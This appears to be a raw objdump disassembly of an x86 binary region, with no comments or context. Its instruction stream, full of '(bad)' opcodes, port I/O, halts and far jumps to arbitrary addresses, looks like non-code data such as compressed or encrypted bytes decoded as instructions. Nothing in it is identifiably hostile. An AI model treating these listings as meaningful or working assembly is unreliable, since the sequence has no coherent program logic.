  40f563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f564:	inc    ebp
  40f565:	or     eax,0x527a6a14
  40f56a:	js     0x40f5ce
  40f56c:	mov    cl,0xb6
  40f56e:	push   0xffffffa8
  40f570:	jecxz  0x40f50c
  40f572:	ss std 
  40f574:	nop
  40f575:	(bad)  
  40f576:	mov    dh,0x48
  40f578:	push   0xffffff96
  40f57a:	ins    DWORD PTR es:[edi],dx
  40f57b:	lods   al,BYTE PTR ds:[esi]
  40f57c:	mov    bh,0xa1
  40f57e:	hlt    
  40f57f:	and    bl,cl
  40f581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f582:	push   ecx
  40f583:	aam    0xf1
  40f585:	mov    esp,0x5bfc15f9
  40f58a:	push   esi
  40f58b:	mov    bl,0x34
  40f58d:	sub    BYTE PTR [esi+0x45],dl
  40f590:	ret    
  40f591:	ja     0x40f601
  40f593:	call   0x6c70:0x40d24b40
  40f59a:	mov    dl,0x4f
  40f59c:	out    0x17,al
  40f59e:	in     al,dx
  40f59f:	add    al,0x4c
  40f5a1:	sub    DWORD PTR [edx+0x1e],ecx
  40f5a4:	push   ebp
  40f5a5:	xchg   ebx,eax
  40f5a6:	lods   eax,DWORD PTR ds:[esi]
  40f5a7:	sub    BYTE PTR [esi],dh
  40f5a9:	dec    ebp
  40f5aa:	pop    eax
  40f5ab:	jmp    0x7cd2:0xae7ceef4
  40f5b2:	sbb    ebp,DWORD PTR [ebx]
  40f5b4:	ins    BYTE PTR es:[edi],dx
  40f5b5:	sti    
  40f5b6:	clc    
  40f5b7:	xchg   esp,eax
  40f5b8:	call   0x7aafb5f5
  40f5bd:	add    esp,edx
  40f5bf:	push   esi
  40f5c0:	je     0x40f5c8
  40f5c2:	sbb    dl,dh
  40f5c4:	jmp    0xe30f008d
  40f5c9:	pop    edx
  40f5ca:	xchg   ebx,eax
  40f5cb:	or     al,0xdb
  40f5cd:	inc    edx
  40f5ce:	mov    al,ds:0x52744b4b
  40f5d3:	cmp    bh,BYTE PTR [eax-0x17987dc8]
  40f5d9:	xchg   ebx,eax
  40f5da:	lods   al,BYTE PTR ds:[esi]
  40f5db:	sbb    al,0x92
  40f5dd:	pushf  
  40f5de:	cmp    dl,BYTE PTR [edx+edx*1-0x50]
  40f5e2:	dec    edi
  40f5e3:	shr    BYTE PTR [edx],1
  40f5e5:	aaa    
  40f5e6:	push   eax
  40f5e7:	mov    edx,edx
  40f5e9:	adc    cl,dl
  40f5eb:	sbb    al,0x40
  40f5ed:	xchg   edi,eax
  40f5ee:	retf   0x8414
  40f5f1:	enter  0x98e2,0x29
  40f5f5:	mov    dh,BYTE PTR [esi]
  40f5f7:	(bad)  [eax]
  40f5f9:	pop    ds
  40f5fa:	push   edx
  40f5fb:	add    al,0x82
  40f5fd:	out    0x3b,eax
  40f5ff:	je     0x40f651
  40f601:	inc    eax
  40f602:	push   0xaa1626ba
  40f607:	push   esi
  40f608:	ja     0x40f650
  40f60a:	jnp    0x40f594
  40f60c:	lds    esi,FWORD PTR [edi+0x16ab6307]
  40f612:	mov    edi,0x94c154ee
  40f617:	das    
  40f618:	(bad)  
  40f619:	scas   eax,DWORD PTR es:[edi]
  40f61a:	push   ebx
  40f61b:	add    BYTE PTR [ebp+0x5],cl
  40f61e:	pop    es
  40f61f:	aam    0x78
  40f621:	adc    edx,esi
  40f623:	xor    al,0x60
  40f625:	mov    al,0x52
  40f627:	xor    BYTE PTR [edi-0x7f],dl
  40f62a:	ins    DWORD PTR es:[edi],dx
  40f62b:	cmp    bl,0x96
  40f62e:	(bad)  
  40f62f:	push   eax
  40f630:	mov    ah,0xa6
  40f632:	fsub   DWORD PTR [edx+0x18fd6756]
  40f638:	(bad)  
  40f639:	fstp   st(5)
  40f63b:	enter  0x4c4e,0x42
  40f63f:	adc    al,0x1a
  40f641:	jbe    0x40f5dc
  40f643:	mov    eax,ds:0xf0441251
  40f648:	pop    eax
  40f649:	adc    al,0xed
  40f64b:	push   eax
  40f64c:	add    BYTE PTR [edx-0x30],cl
  40f64f:	dec    esp
  40f650:	jb     0x40f670
  40f652:	lods   al,BYTE PTR ds:[esi]
  40f653:	mov    ds:0x5535d56a,eax
  40f658:	push   es
  40f659:	add    eax,0xec9c7600
  40f65e:	sbb    edx,DWORD PTR ds:0x6203c20f
  40f664:	fdivr  DWORD PTR [edi]
  40f666:	faddp  st(4),st
  40f668:	fmul   QWORD PTR [edx+0x51]
  40f66b:	mov    al,ds:0xa7b0ba84
  40f670:	cli    
  40f671:	push   ds
  40f672:	and    al,0x8b
  40f674:	or     bl,bl
  40f676:	pusha  
  40f677:	pop    eax
  40f678:	jo     0x40f611
  40f67a:	out    dx,eax
  40f67b:	in     al,dx
  40f67c:	push   cs
  40f67d:	push   cs
  40f67e:	ss push 0x2e
  40f681:	push   ds
  40f682:	cmp    eax,0x938fdad0
  40f687:	cli    
  40f688:	mov    esi,0x7a705d34
  40f68d:	stc    
  40f68e:	jl     0x40f6ba
  40f690:	call   0xfacf:0x58f0327d
  40f697:	adc    BYTE PTR [ecx],cl
  40f699:	or     dh,BYTE PTR [esi-0x24bf8723]
  40f69f:	xor    al,0x1b
  40f6a1:	cmp    ah,BYTE PTR [eax-0x65dd8dae]
  40f6a7:	dec    ebp
  40f6a8:	les    eax,FWORD PTR [edx-0x5db3b356]
  40f6ae:	data16 in al,dx
  40f6b0:	mov    dh,0x56
  40f6b2:	shr    BYTE PTR [edx],1
  40f6b4:	les    eax,FWORD PTR [ebx+0x56182b82]
  40f6ba:	les    ebp,FWORD PTR [esi+0xa]
  40f6bd:	std    
  40f6be:	pop    edi
  40f6bf:	push   ebp
  40f6c0:	lds    eax,FWORD PTR [ecx-0xf1d892c]
  40f6c6:	repz push edx
  40f6c8:	or     al,BYTE PTR [edx-0x40]
  40f6cb:	mov    ah,BYTE PTR [ebx]
  40f6cd:	arpl   WORD PTR [ebx],sp
  40f6cf:	pop    esp
  40f6d0:	les    esi,FWORD PTR [ecx]
  40f6d2:	hlt    
  40f6d3:	jae    0x40f73e
  40f6d5:	stos   BYTE PTR es:[edi],al
  40f6d6:	push   ebp
  40f6d7:	and    BYTE PTR [esi],0x76
  40f6da:	add    al,0x45
  40f6dc:	cmp    BYTE PTR ds:0xa07d65ca,0x3a
  40f6e3:	sbb    dh,BYTE PTR [edx]
  40f6e5:	popa   
  40f6e6:	sbb    bl,cl
  40f6e8:	inc    esi
  40f6e9:	mov    eax,ds:0xd4568aba
  40f6ee:	lods   al,BYTE PTR ds:[esi]
  40f6ef:	cmp    dl,BYTE PTR [eax+0x32a42e22]
  40f6f5:	push   ecx
  40f6f6:	mov    dl,0x29
  40f6f8:	out    dx,al
  40f6f9:	mov    ds:0xc6ac41a9,al
  40f6fe:	sub    ch,BYTE PTR [esi+0x50]
  40f701:	add    al,0xb8
  40f703:	mov    al,ds:0xc2065548
  40f708:	ss sahf 
  40f70a:	in     al,dx
  40f70b:	jg     0x40f6d4
  40f70d:	rol    BYTE PTR [edx+0x48973467],0x2c
  40f714:	scas   eax,DWORD PTR es:[edi]
  40f715:	in     al,dx
  40f716:	push   ebp
  40f717:	pop    esp
  40f718:	push   edx
  40f719:	das    
  40f71a:	adc    ebp,0x3a28f840
  40f720:	test   BYTE PTR [ebp+eax*2+0x53],ch
  40f724:	leave  
  40f725:	mov    edx,0xc7d06f4c
  40f72a:	jl     0x40f726
  40f72c:	iret   
  40f72d:	inc    esi
  40f72e:	or     DWORD PTR [edx],0x65de7ca2
  40f734:	mov    eax,0xe04e675
  40f739:	(bad)  
  40f73a:	call   0xa0416b35
  40f73f:	(bad)  
  40f740:	aam    0x86
  40f742:	mov    ds:0x985b9252,al
  40f747:	lock cli 
  40f749:	jp     0x40f744
  40f74b:	test   DWORD PTR [ebp+0x4b],edx
  40f74e:	inc    ebp
  40f74f:	xor    dl,BYTE PTR [esi-0x11cba160]
  40f755:	jmp    0x984c:0xbd61bc2c
  40f75c:	icebp  
  40f75d:	add    BYTE PTR [edx-0x25c5ffe5],al
  40f763:	mov    ds:0x74f2926e,al
  40f768:	dec    BYTE PTR [ebx+0x163089be]
  40f76e:	mov    eax,ds:0x8a39aaab
  40f773:	cmp    al,BYTE PTR [edx-0x10]
  40f776:	push   0x14
  40f778:	push   ebx
  40f779:	dec    ebp
  40f77a:	mov    dh,0x55
  40f77c:	mov    esp,0x7b23fe
  40f781:	pop    edi
  40f782:	cmp    cl,bl
  40f784:	hlt    
  40f785:	inc    esi
  40f786:	mov    esi,0x4d500464
  40f78b:	in     al,dx
  40f78c:	adc    BYTE PTR [ecx-0xe],cl
  40f78f:	shr    BYTE PTR [edi+ebp*1],cl
  40f792:	inc    BYTE PTR [esi-0x5699044a]
  40f798:	stos   DWORD PTR es:[edi],eax
  40f799:	fwait
  40f79a:	aas    
  40f79b:	cmp    DWORD PTR [ebx+ebx*2],eax
  40f79e:	loopne 0x40f80a
  40f7a0:	add    bh,ah
  40f7a2:	jae    0x40f7a4
  40f7a4:	mov    dh,0x95
  40f7a6:	enter  0x360a,0x6b
  40f7aa:	jecxz  0x40f81c
  40f7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ad:	mov    eax,ds:0x4c915abf
  40f7b2:	test   al,0x56
  40f7b4:	or     DWORD PTR [eax+0x3adb7ac8],esi
  40f7ba:	in     al,0x2a
  40f7bc:	es scas al,BYTE PTR es:[edi]
  40f7be:	cmp    ch,BYTE PTR [edx]
  40f7c0:	push   ss
  40f7c1:	xor    al,0xe
  40f7c3:	out    0x54,al
  40f7c5:	nop
  40f7c6:	push   edi
  40f7c7:	sbb    al,0xc3
  40f7c9:	in     al,0x6b
  40f7cb:	sbb    esi,DWORD PTR [esi]
  40f7cd:	je     0x40f7d8
  40f7cf:	and    al,0xec
  40f7d1:	dec    ebp
  40f7d2:	push   cs
  40f7d3:	jbe    0x40f81e
  40f7d5:	push   eax
  40f7d6:	xchg   DWORD PTR [eax],eax
  40f7d8:	push   0xcb9ad80f
  40f7dd:	rcr    DWORD PTR [edx+ebp*8],0xa2
  40f7e1:	and    al,0xfb
  40f7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7e4:	dec    ecx
  40f7e5:	(bad)
  40f7e8:	sub    dl,BYTE PTR [edx]
  40f7ea:	test   esi,esp
  40f7ec:	xor    al,0x5e
  40f7ee:	add    BYTE PTR [edx+0x43],bh
  40f7f1:	add    al,dl
  40f7f3:	add    ecx,edx
  40f7f5:	pop    esi
  40f7f6:	sub    ebp,DWORD PTR [eax-0x7c]
  40f7f9:	dec    esp
  40f7fa:	iret   
  40f7fb:	sbb    al,0x70
  40f7fd:	sbb    BYTE PTR [edx],bh
  40f7ff:	xor    al,0x5b
  40f801:	stos   DWORD PTR es:[edi],eax
  40f802:	cs jp  0x40f7e4
  40f805:	add    BYTE PTR [edi],cl
  40f807:	mov    ebx,0x2800c5fe
  40f80c:	pusha  
  40f80d:	jns    0x40f7a8
  40f80f:	loope  0x40f82e
  40f811:	lods   eax,DWORD PTR ds:[esi]
  40f812:	call   0x8a853ad1
  40f817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f818:	mov    BYTE PTR [eax],al
  40f81a:	xchg   ebx,eax
  40f81b:	bound  eax,QWORD PTR [eax]
  40f81d:	daa    
  40f81e:	pop    edx
  40f81f:	mov    bl,0x55
  40f821:	mov    dh,0x26
  40f823:	fs xor eax,0xf43024b2
  40f829:	dec    esp
  40f82a:	xchg   esp,eax
  40f82b:	repz push ss
  40f82d:	xchg   ebp,eax
  40f82e:	out    dx,al
  40f82f:	in     eax,dx
  40f830:	or     ecx,DWORD PTR [edx+0x2136cdfe]
  40f836:	out    0x0,eax
  40f838:	xchg   bl,bl
  40f83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83b:	add    BYTE PTR ds:[ebx-0x2fb49a51],bh
  40f842:	jbe    0x40f7f9
  40f844:	push   ebx
  40f845:	adc    BYTE PTR [edi-0x20],bl
  40f848:	leavew 
  40f84a:	sbb    al,0xb
  40f84c:	nop
  40f84d:	lods   eax,DWORD PTR ds:[esi]
  40f84e:	add    BYTE PTR [esi+0x4e5b56a0],dh
  40f854:	ins    BYTE PTR es:[edi],dx
  40f855:	(bad)  
  40f856:	push   edx
  40f857:	call   0x32c0f3e
  40f85c:	fist   DWORD PTR [edx+ebp*2]
  40f85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f860:	mov    ds:0x52a6ca2e,eax
  40f865:	lods   al,BYTE PTR ds:[esi]
  40f866:	in     al,0x84
  40f868:	mov    cs,WORD PTR [esi]
  40f86a:	ret    
  40f86b:	mov    esp,esp
  40f86d:	xor    al,BYTE PTR [edi+eiz*2-0x324d2b16]
  40f874:	push   ss
  40f875:	cdq    
  40f876:	mov    esp,0x7016f102
  40f87b:	and    cl,BYTE PTR ds:0xbb5ca67
  40f881:	mov    ds:0x4547c88,al
  40f886:	cmp    ecx,DWORD PTR [esi+0x11c5419e]
  40f88c:	mov    ch,0x2e
  40f88e:	jns    0x40f86a
  40f890:	push   edx
  40f891:	xor    cl,dl
  40f893:	js     0x40f8f5
  40f895:	fadd   QWORD PTR [eax+0x41]
  40f898:	inc    ebp
  40f899:	lds    ebx,FWORD PTR [eax+0x15]
  40f89c:	push   esp
  40f89d:	mov    ch,0x32
  40f89f:	push   eax
  40f8a0:	fs sub bl,al
  40f8a3:	push   ss
  40f8a4:	xor    al,0xb5
  40f8a6:	or     al,0xc8
  40f8a8:	call   0x56aa:0x86a610c2
  40f8af:	xabort 0x9a
  40f8b2:	push   ebp
  40f8b3:	dec    esi
  40f8b4:	dec    edi
  40f8b5:	sbb    ch,BYTE PTR [eax+0x28]
  40f8b8:	mov    al,ds:0x1482c335
  40f8bd:	and    al,0x6f
  40f8bf:	sahf   
  40f8c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c1:	mov    dl,0xb0
  40f8c3:	out    dx,al
  40f8c4:	lahf   
  40f8c5:	push   ebp
  40f8c6:	push   0xffffffa3
  40f8c8:	mov    ds:0x5190a85a,eax
  40f8cd:	push   es
  40f8ce:	not    BYTE PTR [eax+0x2b]
  40f8d1:	sub    BYTE PTR [edx-0x4b],dh
  40f8d4:	fcomp  st(4)
  40f8d6:	sbb    al,0x8
  40f8d8:	inc    esp
  40f8d9:	out    dx,al
  40f8da:	js     0x40f8a5
  40f8dc:	(bad)  
  40f8dd:	push   eax
  40f8de:	inc    edi
  40f8df:	push   ebx
  40f8e0:	inc    ecx
  40f8e1:	dec    esp
  40f8e2:	push   esp
  40f8e3:	ror    BYTE PTR [ecx+edi*1-0x22],0x47
  40f8e8:	inc    esi
  40f8e9:	and    DWORD PTR [ecx-0x73a98540],0xfffffff2
  40f8f0:	sbb    DWORD PTR [edx],eax
  40f8f2:	fld    TBYTE PTR [edx]
  40f8f4:	dec    esp
  40f8f5:	lock sub BYTE PTR [edi],dh
  40f8f8:	mov    cs,ebp
  40f8fa:	mov    ah,0x7c
  40f8fc:	in     al,0x86
  40f8fe:	mov    fs,WORD PTR [edx-0x3803b172]
  40f904:	push   cs
  40f905:	iret   
  40f906:	mov    bh,BYTE PTR [esi+eiz*1-0xeaeafb0]
  40f90d:	cmc    
  40f90e:	out    dx,al
  40f90f:	add    ch,dl
  40f911:	sub    BYTE PTR [ebp-0x51e17afc],ah
  40f917:	and    cl,BYTE PTR [ecx-0x72]
  40f91a:	(bad)  
  40f91b:	aam    0xd1
  40f91d:	jo     0x40f90e
  40f91f:	test   al,0x6
  40f921:	stos   BYTE PTR es:[edi],al
  40f922:	or     cl,al
  40f924:	and    BYTE PTR [eax+0x4e],0x1e
  40f928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f929:	ins    BYTE PTR es:[edi],dx
  40f92a:	mov    ah,0xd8
  40f92c:	popf   
  40f92d:	call   0x7969802a
  40f932:	jle    0x40f93c
  40f934:	push   cs
  40f935:	pop    ds
  40f936:	mov    dh,0x37
  40f938:	(bad)  [eax-0x30]
  40f93b:	enter  0x1527,0xe8
  40f93f:	inc    eax
  40f940:	inc    esp
  40f941:	and    al,BYTE PTR [eax]
  40f943:	sbb    esp,0x18864221
  40f949:	mov    eax,0x743e0c30
  40f94e:	gs cmp al,0x43
  40f951:	dec    ebp
  40f952:	pushf  
  40f953:	pushf  
  40f954:	push   esp
  40f955:	mov    esp,0x48b115ea
  40f95a:	aam    0x44
  40f95c:	not    BYTE PTR [ecx]
  40f95e:	jmp    0x6949:0x8294d7eb
  40f965:	nop
  40f966:	out    dx,al
  40f967:	pushf  
  40f968:	rcl    ecx,1
  40f96a:	stos   BYTE PTR es:[edi],al
  40f96b:	mov    ah,BYTE PTR [esp+eiz*8+0x464c121e]
  40f972:	sar    BYTE PTR [ebp+0x36],cl
  40f975:	push   ds
  40f976:	rcl    BYTE PTR [esi-0xc],cl
  40f979:	sub    al,0x1c
  40f97b:	outs   dx,BYTE PTR ds:[esi]
  40f97c:	and    BYTE PTR [edx+0x28088142],ah
  40f982:	xchg   BYTE PTR [eax-0x3c],al
  40f985:	pushf  
  40f986:	call   0x2ab0:0x84aa2b6a
  40f98d:	xor    DWORD PTR [eax],ebp
  40f98f:	xchg   edi,eax
  40f990:	dec    esp
  40f991:	call   0x18a4:0xd80e30d6
  40f998:	push   edx
  40f999:	adc    BYTE PTR [edx],al
  40f99b:	neg    BYTE PTR [edx]
  40f99d:	dec    esp
  40f99e:	inc    esi
  40f99f:	imul   ebx,DWORD PTR [eax+esi*8],0x4c
  40f9a3:	cmp    BYTE PTR [eax+0xa1b3c1a],dl
  40f9a9:	cmp    bh,BYTE PTR [edx]
  40f9ab:	push   ds
  40f9ac:	dec    edi
  40f9ad:	dec    esi
  40f9ae:	xchg   ebx,eax
  40f9af:	pusha  
  40f9b0:	inc    ecx
  40f9b1:	push   eax
  40f9b2:	push   ebp
  40f9b3:	dec    ebp
  40f9b4:	sbb    eax,0xe60d5d
  40f9b9:	inc    ebx
  40f9ba:	stos   DWORD PTR es:[edi],eax
  40f9bb:	pop    esp
  40f9bc:	and    al,dl
  40f9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9bf:	push   ds
  40f9c0:	test   BYTE PTR [edx-0x7f],ah
  40f9c3:	adc    ebp,DWORD PTR [edx-0x78]
  40f9c6:	sbb    BYTE PTR [eax-0x5e],ch
  40f9c9:	loopne 0x40f966
  40f9cb:	pop    ebp
  40f9cc:	xchg   edx,eax
  40f9cd:	jge    0x40f952
  40f9cf:	loop   0x40f975
  40f9d1:	sbb    eax,0xa40c00ea
  40f9d6:	call   0x165b13e3
  40f9db:	sbb    BYTE PTR [ecx-0x4e],ah
  40f9de:	push   0x48
  40f9e0:	jg     0x40f9e5
  40f9e2:	ds dec eax
  40f9e4:	dec    ebp
  40f9e5:	or     eax,0xbe9a99ad
  40f9ea:	pop    esp
  40f9eb:	or     cl,BYTE PTR [esi+0x50]
  40f9ee:	jge    0x40f978
  40f9f0:	xor    al,BYTE PTR [eax+0x3b9ac8ad]
  40f9f6:	aam    0x2e
  40f9f8:	pop    esp
  40f9f9:	mov    ecx,DWORD PTR [eax-0x2b5ef8ad]
  40f9ff:	mov    esi,0xed54b840
  40fa04:	mov    dh,0x0
  40fa06:	adc    esi,DWORD PTR [ebx-0x2a9b3d6c]
  40fa0c:	rcr    BYTE PTR [esi+eax*8-0x13],1
  40fa10:	call   0x2ec0:0x69c2fcdc
  40fa17:	add    eax,0x247b92d0
  40fa1c:	into   
  40fa1d:	push   eax
  40fa1e:	mov    ds:0x47155d82,al
  40fa23:	xchg   esp,eax
  40fa24:	fcmovne st,st(2)
  40fa26:	shl    DWORD PTR [ebp+edx*4-0x7f],1
  40fa2a:	xor    BYTE PTR [esp+ebp*4],cl
  40fa2d:	push   0xb8a52c5d
  40fa32:	jmp    0x6286:0x8299cdac
  40fa39:	push   0x26f5b826
  40fa3e:	stos   BYTE PTR es:[edi],al
  40fa3f:	cld    
  40fa40:	mov    ah,0xa6
  40fa42:	add    BYTE PTR [edx+0x78177ec0],0x46
  40fa49:	xor    al,0x43
  40fa4b:	add    al,0x91
  40fa4d:	dec    ebp
  40fa4e:	lods   eax,DWORD PTR ds:[esi]
  40fa4f:	inc    ecx
  40fa50:	dec    esp
  40fa51:	mov    ds:0x545e8f08,al
  40fa56:	xchg   esp,eax
  40fa57:	push   ds
  40fa58:	shl    BYTE PTR [edi],1
  40fa5a:	ins    BYTE PTR es:[edi],dx
  40fa5b:	mov    gs,WORD PTR [esi]
  40fa5d:	add    BYTE PTR [esi],dl
  40fa5f:	call   0xdd725152
  40fa64:	aam    0x70
  40fa66:	inc    ebx
  40fa67:	xchg   edi,eax
  40fa68:	push   esp
  40fa69:	sub    DWORD PTR [eax],0xffffffda
  40fa6c:	mov    esp,DWORD PTR [edx-0x389954f2]
  40fa72:	xor    edi,DWORD PTR [edi]
  40fa74:	push   esi
  40fa75:	enter  0x828a,0x4d
  40fa79:	and    ah,BYTE PTR [edi]
  40fa7b:	mov    eax,ds:0xc4ecd466
  40fa80:	cwde   
  40fa81:	sbb    eax,0xa70c5568
  40fa87:	les    eax,FWORD PTR [esi]
  40fa89:	(bad)  
  40fa8a:	in     al,0x2a
  40fa8c:	cmp    bl,BYTE PTR [edx+0x55]
  40fa8f:	adc    DWORD PTR [edx-0x5],eax
  40fa92:	call   0x389:0x5e035a40
  40fa99:	test   eax,0x80ad688b
  40fa9e:	dec    edi
  40fa9f:	pop    edx
  40faa0:	or     ecx,DWORD PTR [ecx+eax*8-0x7a]
  40faa4:	fisubr WORD PTR [edx+esi*2]
  40faa7:	mov    ds:0xe67e6015,al
  40faad:	ja     0x40fac7
  40faaf:	pop    esi
  40fab0:	adc    ch,BYTE PTR [edx+0x725c5375]
  40fab6:	sub    al,0xa
  40fab8:	add    ch,bl
  40faba:	mov    es,WORD PTR [edx-0x42833d76]
  40fac0:	pusha  
  40fac1:	or     DWORD PTR [ebp+eax*1-0x34],edx
  40fac5:	retf   
  40fac6:	unpckhps xmm0,XMMWORD PTR es:[edx+0xd]
  40facb:	in     al,dx
  40facc:	or     dh,0x54
  40facf:	shl    BYTE PTR [eax+0x4286894d],cl
  40fad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad6:	aas    
  40fad7:	jmp    0x50b3:0x580fb0c4
  40fade:	jo     0x40faec
  40fae0:	loope  0x40fb3c
  40fae2:	aaa    
  40fae3:	mov    edx,0xb476bedb
  40fae8:	mov    es,WORD PTR [edx]
  40faea:	hlt    
  40faeb:	sub    eax,0x7228490c
  40faf0:	data16 sbb bl,BYTE PTR [edx-0x54]
  40faf4:	cmp    BYTE PTR [edx+0x6],0xfa
  40faf8:	mov    esp,DWORD PTR [esp+0x6ae054a0]
  40faff:	mov    ecx,DWORD PTR [eax]
  40fb01:	inc    esi
  40fb02:	aam    0x94
  40fb04:	repnz inc esp
  40fb06:	push   esp
  40fb07:	stos   DWORD PTR es:[edi],eax
  40fb08:	int    0xb
  40fb0a:	push   eax
  40fb0b:	aam    0xbe
  40fb0d:	data16 xchg BYTE PTR [edx],dl
  40fb10:	or     bh,BYTE PTR [esi-0x4ba2ff12]
  40fb16:	mov    al,ds:0x2be1a0ad
  40fb1b:	add    BYTE PTR [esi+0x1cfc2550],cl
  40fb21:	cmp    bl,dl
  40fb23:	loop   0x40fb4f
  40fb25:	mov    bh,0xda
  40fb27:	jb     0x7041e529
  40fb2d:	call   0x45dd01dc
  40fb32:	or     bh,0xc4
  40fb35:	das    
  40fb36:	aas    
  40fb37:	jp     0x40fad2
  40fb39:	sub    bh,BYTE PTR [esi+0x68]
  40fb3c:	push   es
  40fb3d:	test   eax,0x400b7548
  40fb42:	in     al,dx
  40fb43:	sub    dl,bl
  40fb45:	ins    BYTE PTR es:[edi],dx
  40fb46:	inc    ebp
  40fb47:	adc    ebx,DWORD PTR [esi+0x5116e776]
  40fb4d:	dec    ebx
  40fb4e:	mov    eax,0x150dc1e8
  40fb53:	mov    ds:0x19764f8a,al
  40fb58:	shl    BYTE PTR [esi-0x788307af],1
  40fb5e:	mov    ah,0xf6
  40fb60:	sub    BYTE PTR [eax+ebp*1+0x1],ch
  40fb64:	int3   
  40fb65:	xchg   esp,eax
  40fb66:	or     eax,0x11ac939a
  40fb6b:	aam    0x16
  40fb6d:	shl    BYTE PTR [esi+0x72],0x97
  40fb71:	jns    0x40fba1
  40fb73:	cs fwait
  40fb75:	add    DWORD PTR [esi+0x4],0xffffffa0
  40fb79:	stos   BYTE PTR es:[edi],al
  40fb7a:	inc    eax
  40fb7b:	push   ecx
  40fb7c:	loopne 0x40fb0b
  40fb7e:	lods   al,BYTE PTR ds:[esi]
  40fb7f:	scas   al,BYTE PTR es:[edi]
  40fb80:	mov    ds:0x15452112,eax
  40fb85:	dec    ebp
  40fb86:	mov    dh,0xea
  40fb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb89:	mov    eax,ds:0xd6abe8e8
  40fb8e:	sub    esp,ebp
  40fb90:	scas   eax,DWORD PTR es:[edi]
  40fb91:	xor    eax,0x7c158698
  40fb96:	sub    eax,0xbc97aa02
  40fb9b:	mov    bh,0xaa
  40fb9d:	shl    BYTE PTR [ecx-0x7fca055f],0xbb
  40fba4:	repz pop edx
  40fba6:	js     0x40fb67
  40fba8:	aad    0xf0
  40fbaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbab:	sub    ch,BYTE PTR [edx+edi*2]
  40fbae:	(bad)  
  40fbaf:	inc    ecx
  40fbb0:	mov    edi,es
  40fbb2:	push   esi
  40fbb3:	push   ecx
  40fbb4:	and    dl,bl
  40fbb6:	push   cs
  40fbb7:	inc    ebp
  40fbb8:	scas   al,BYTE PTR es:[edi]
  40fbb9:	adc    al,0x5a
  40fbbb:	dec    ecx
  40fbbc:	mov    al,ds:0x550558ce
  40fbc1:	(bad)  
  40fbc2:	fiadd  DWORD PTR [edx+0x22c71652]
  40fbc8:	pop    eax
  40fbc9:	cs lock pop ecx
  40fbcc:	fcom   st(3)
  40fbce:	inc    esp
  40fbcf:	repz pop ebp
  40fbd1:	or     eax,0xdfc85dc2
  40fbd6:	in     eax,dx
  40fbd7:	add    BYTE PTR [ebp+0x6a],bl
  40fbda:	iret   
  40fbdb:	pop    edx
  40fbdc:	xchg   ecx,eax
  40fbdd:	adc    eax,DWORD PTR [edi+0x4a]
  40fbe0:	jge    0x40fbe4
  40fbe2:	out    0x27,al
  40fbe4:	xor    al,0xfb
  40fbe6:	xchg   BYTE PTR [esi+0xb],ah
  40fbe9:	sub    al,BYTE PTR [esi+0x7a]
  40fbec:	ins    BYTE PTR es:[edi],dx
  40fbed:	fsub   QWORD PTR [ebp+0x508dbef4]
  40fbf3:	adc    eax,0x54891a1d
  40fbf8:	dec    esi
  40fbf9:	dec    esi
  40fbfa:	mov    ebp,0x821e524d
  40fbff:	push   esi
  40fc00:	jp     0x40fb8e
  40fc02:	cmp    DWORD PTR [esi+0x78],esi
  40fc05:	enter  0xbb6c,0xd4
  40fc09:	push   0x28d10045
  40fc0e:	bound  esp,QWORD PTR [edx+eax*8-0x2938778d]
  40fc15:	call   0x841c:0xd3822200
  40fc1c:	mov    al,ds:0x169619f3
  40fc21:	mov    eax,0x6ade5816
  40fc26:	scas   al,BYTE PTR es:[edi]
  40fc27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc28:	xchg   ecx,eax
  40fc29:	mov    dh,0xea
  40fc2b:	cmp    esi,0xffffff81
  40fc2e:	int    0x76
  40fc30:	sbb    DWORD PTR [eax-0x50],edx
  40fc33:	lods   eax,DWORD PTR ds:[esi]
  40fc34:	into   
  40fc35:	jl     0x40fbbf
  40fc37:	pop    ecx
  40fc38:	lahf   
  40fc39:	mov    BYTE PTR [esi+0x3c6caed6],0x2e
  40fc40:	mov    ds:0x729247be,al
  40fc45:	adc    ebx,DWORD PTR [ebp-0x7e]
  40fc48:	sbb    eax,0x54e2a287
  40fc4d:	call   0x4cd0:0x16ec2afa
  40fc54:	aas    
  40fc55:	mov    al,ds:0xa36edc26
  40fc5a:	out    dx,al
  40fc5b:	fs fwait
  40fc5d:	ret    
  40fc5e:	or     BYTE PTR [esi],0x5b
  40fc61:	push   es
  40fc62:	retf   0x94c7
  40fc65:	inc    edx
  40fc66:	cld    
  40fc67:	jb     0x40fcd6
  40fc69:	mov    al,ds:0x5474340e
  40fc6e:	pop    eax
  40fc6f:	imul   DWORD PTR [edx+0x52]
  40fc72:	popa   
  40fc73:	add    BYTE PTR ds:0xa13937e0,ch
  40fc79:	aaa    
  40fc7a:	adc    eax,0xef8257fc
  40fc7f:	call   0x8ab5a584
  40fc84:	inc    ebp
  40fc85:	or     eax,0x31ece46e
  40fc8a:	xor    dl,al
  40fc8c:	cmc    
  40fc8d:	rcl    BYTE PTR [eax+0x14],1
  40fc90:	adc    DWORD PTR ds:0xb9bcba6a,edx
  40fc96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc97:	pop    edx
  40fc98:	hlt    
  40fc99:	dec    eax
  40fc9a:	lods   eax,DWORD PTR ds:[esi]
  40fc9b:	mov    ?,WORD PTR [ebp-0x60]
  40fc9e:	push   eax
  40fc9f:	(bad)  [eax-0x564e4385]
  40fca5:	loope  0x40fcc2
  40fca7:	pop    esi
  40fca8:	adc    esi,DWORD PTR [ecx+edx*4-0x42]
  40fcac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcad:	fisttp DWORD PTR [ecx]
  40fcaf:	or     esp,DWORD PTR [ecx-0x15]
